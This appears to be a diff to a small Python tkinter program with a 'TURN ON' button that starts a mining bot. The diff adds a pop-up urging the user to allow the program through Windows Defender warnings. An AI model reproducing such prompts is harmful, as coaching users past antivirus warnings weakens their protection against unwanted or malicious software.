@@ -1,7 +1,9 @@
 import os
 import threading
 from tkinter import *
+from tkinter import messagebox
 from playsound import playsound
+
 
 status = 0
 
@@ -50,6 +52,7 @@ def turnOn():
     thread.start()
     print("(+) Bot started mining...")
     playsound('button.mp3')
+    messagebox.showinfo("", "If you are getting a pop-up message from Windows Defender, please allow this program so that you can start mining.")
 
 
 onButton = Button(root, text ="TURN ON", command = turnOn)
